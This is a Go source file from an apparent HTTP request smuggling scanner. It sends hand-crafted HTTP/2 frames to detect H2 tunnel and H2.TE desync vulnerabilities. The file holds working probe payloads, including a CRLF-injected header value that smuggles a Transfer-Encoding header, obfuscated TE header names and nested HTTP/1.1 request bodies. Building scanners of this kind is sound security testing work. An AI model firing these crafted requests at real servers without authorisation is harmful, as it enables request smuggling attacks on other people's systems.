package scan

// h2tunnel.go — HTTP/2 tunnel desync + H2.TE via HEAD/GET (HeadScanTE.java + H2TunnelScan.java)
//
// Two related attacks:
//
// 1. H2 Tunnel (H2TunnelScan.java):
//    Send an H2 request (GET/POST/HEAD/OPTIONS) whose body contains an
//    invalid HTTP/1.1 request. If the front-end tunnels H2→H1 without
//    stripping the body, the back-end processes the nested request.
//    Detection: look for a "mixed response" — an HTTP/1.x response
//    line inside the body of the H2 response (HeadScanTE.mixedResponse).
//
// 2. H2.TE Tunnel (HeadScanTE.java):
//    Send an H2 request with Transfer-Encoding: chunked and a smuggled
//    body (e.g. "FOO BAR AAH\r\n\r\n"). The front-end may not strip the
//    TE header before downgrading to H1, causing the back-end to read
//    the body as a chunked stream and expose the tunnelled content.
//    Detection: same mixedResponse check.

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"

	"github.com/smuggled/smuggled/pkg/report"
)

const h2trigger = "FOO BAR AAH\r\n\r\n"
const h2triggerShort = "FOO\r\n\r\n"

var h2TunnelMethods = []string{"GET", "POST", "HEAD", "OPTIONS"}

// ScanH2Tunnel probes for H2 tunnel desync (body passes through to back-end).
func ScanH2Tunnel(target *url.URL, base []byte, cfg Config, rep *report.Reporter) {
	if target.Scheme != "https" {
		return
	}
	if !supportsH2(target, cfg) {
		rep.Log("H2Tunnel: %s does not negotiate h2, skipping", target.Host)
		return
	}

	path := target.RequestURI()
	if path == "" {
		path = "/"
	}
	host := target.Hostname()

	for _, method := range h2TunnelMethods {
		for _, trigger := range []string{h2trigger, h2triggerShort} {
			rep.Log("H2Tunnel probe: method=%s trigger=%q target=%s", method, trigger, host)

			resp, err := h2RawRequest(target, method, path, host, trigger, nil, cfg)
			if err != nil {
				rep.Log("H2Tunnel error: %v", err)
				continue
			}

			if mixedH2Response(resp) {
				rep.Emit(report.Finding{
					Target:   target.String(),
					Severity: report.SeverityConfirmed,
					Type:     "H2-tunnel",
					Technique: fmt.Sprintf("H2-tunnel/%s", method),
					Description: fmt.Sprintf(
						"H2 tunnel desync: an HTTP/1.x response was detected inside the H2 response body "+
							"(method=%s). The front-end is tunnelling the request body to the back-end without "+
							"stripping it, allowing injection of arbitrary HTTP/1.1 requests.",
						method),
					Evidence: fmt.Sprintf("trigger=%q mixed_response=true", trigger),
				})
				return
			}
		}
	}
}

// ScanHeadScanTE probes for H2.TE tunnel via Transfer-Encoding injection in H2 (HeadScanTE.java).
func ScanHeadScanTE(target *url.URL, base []byte, cfg Config, rep *report.Reporter) {
	if target.Scheme != "https" {
		return
	}
	if !supportsH2(target, cfg) {
		rep.Log("HeadScanTE: %s does not negotiate h2, skipping", target.Host)
		return
	}

	path := target.RequestURI()
	if path == "" {
		path = "/"
	}
	host := target.Hostname()

	// TE permutations to inject — mirroring h2Permutations in DesyncBox.java
	tePermutations := []struct {
		name  string
		extra map[string]string // extra headers to inject
	}{
		{"vanilla", nil},
		{"http2hide", map[string]string{"Foo": "b\r\nTransfer-Encoding: chunked\r\nx"}},
		{"h2colon", map[string]string{"Transfer-Encoding`chunked ": "chunked"}},
		{"h2space", map[string]string{"Transfer-Encoding chunked ": "chunked"}},
		{"h2prefix", map[string]string{":transfer-encoding": "chunked"}},
	}

	for _, method := range []string{"GET", "POST"} {
		for _, perm := range tePermutations {
			// Build extra headers — override Transfer-Encoding with obfuscated version
			extraHeaders := map[string]string{
				"transfer-encoding": "chunked",
			}
			for k, v := range perm.extra {
				extraHeaders[k] = v
				delete(extraHeaders, "transfer-encoding") // remove vanilla TE if injecting obfuscated
			}

			// Also inject method-override headers
			for _, h := range methodOverrideHeaders {
				extraHeaders[strings.ToLower(h)] = "HEAD"
			}

			rep.Log("HeadScanTE probe: method=%s perm=%s target=%s", method, perm.name, host)

			// Send with trigger as body
			resp, err := h2RawRequest(target, method, path, host, h2trigger, extraHeaders, cfg)
			if err != nil {
				continue
			}

			if mixedH2Response(resp) {
				rep.Emit(report.Finding{
					Target:   target.String(),
					Severity: report.SeverityConfirmed,
					Type:     "H2.TE-tunnel",
					Technique: fmt.Sprintf("HeadTE/%s/%s", method, perm.name),
					Description: fmt.Sprintf(
						"H2.TE tunnel desync confirmed: mixed HTTP/1.x response detected in H2 response body "+
							"(method=%s, TE permutation=%s). The back-end is processing tunnelled requests.",
						method, perm.name),
					Evidence: "mixed_h2_response=true",
				})
				return
			}
		}
	}
}

// ─── H2 raw framing ──────────────────────────────────────────────────────────

// h2RawRequest sends a raw HTTP/2 request using our own HPACK-encoded HEADERS frame.
// body is appended as a DATA frame; extraHeaders are injected after pseudo-headers.
func h2RawRequest(target *url.URL, method, path, host, body string, extraHeaders map[string]string, cfg Config) ([]byte, error) {
	addr := target.Hostname() + ":443"
	if p := target.Port(); p != "" {
		addr = target.Hostname() + ":" + p
	}

	tlsCfg := &tls.Config{
		ServerName:         target.Hostname(),
		InsecureSkipVerify: cfg.SkipTLSVerify, //nolint:gosec
		NextProtos:         []string{"h2"},
	}
	dialer := &net.Dialer{Timeout: cfg.Timeout}
	conn, err := tls.DialWithDialer(dialer, "tcp", addr, tlsCfg)
	if err != nil {
		return nil, fmt.Errorf("h2 dial: %w", err)
	}
	defer conn.Close()

	if conn.ConnectionState().NegotiatedProtocol != "h2" {
		return nil, fmt.Errorf("h2 not negotiated")
	}

	conn.SetDeadline(time.Now().Add(cfg.Timeout)) //nolint:errcheck

	// Client preface
	if _, err := conn.Write([]byte(http2.ClientPreface)); err != nil {
		return nil, err
	}

	framer := http2.NewFramer(conn, conn)
	framer.AllowIllegalWrites = true
	framer.AllowIllegalReads = true

	if err := framer.WriteSettings(); err != nil {
		return nil, err
	}

	// HEADERS frame
	var hbuf bytes.Buffer
	enc := hpack.NewEncoder(&hbuf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: method})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: "content-type", Value: "application/x-www-form-urlencoded"})
	enc.WriteField(hpack.HeaderField{Name: "content-length", Value: fmt.Sprintf("%d", len(body))})
	enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: "identity"})
	for k, v := range extraHeaders {
		enc.WriteField(hpack.HeaderField{Name: k, Value: v, Sensitive: false})
	}

	if err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: hbuf.Bytes(),
		EndStream:     false,
		EndHeaders:    true,
	}); err != nil {
		return nil, err
	}

	// DATA frame
	if err := framer.WriteData(1, true, []byte(body)); err != nil {
		return nil, err
	}

	// Read response frames
	var respBuf bytes.Buffer
	deadline := time.Now().Add(cfg.Timeout)
	for time.Now().Before(deadline) {
		conn.SetReadDeadline(time.Now().Add(2 * time.Second)) //nolint:errcheck
		frame, err := framer.ReadFrame()
		if err != nil {
			break
		}
		switch f := frame.(type) {
		case *http2.DataFrame:
			respBuf.Write(f.Data())
		case *http2.HeadersFrame:
			respBuf.Write(f.HeaderBlockFragment())
		case *http2.RSTStreamFrame, *http2.GoAwayFrame:
			goto done
		case *http2.SettingsFrame:
			framer.WriteSettingsAck() //nolint:errcheck
		}
	}
done:
	return respBuf.Bytes(), nil
}

// mixedH2Response detects an HTTP/1.x response line inside an H2 response body.
// This is the Go equivalent of HeadScanTE.mixedResponse() in Java.
func mixedH2Response(resp []byte) bool {
	s := string(resp)
	return (strings.Contains(s, "HTTP/1.0 ") || strings.Contains(s, "HTTP/1.1 ")) &&
		strings.Contains(s, "HTTP/2")
}

// supportsH2 checks ALPN negotiation via TLS handshake.
func supportsH2(target *url.URL, cfg Config) bool {
	addr := target.Hostname() + ":443"
	if p := target.Port(); p != "" {
		addr = target.Hostname() + ":" + p
	}
	tlsCfg := &tls.Config{
		ServerName:         target.Hostname(),
		InsecureSkipVerify: cfg.SkipTLSVerify, //nolint:gosec
		NextProtos:         []string{"h2", "http/1.1"},
	}
	dialer := &net.Dialer{Timeout: cfg.Timeout}
	conn, err := tls.DialWithDialer(dialer, "tcp", addr, tlsCfg)
	if err != nil {
		return false
	}
	defer conn.Close()
	return strings.Contains(conn.ConnectionState().NegotiatedProtocol, "h2")
}
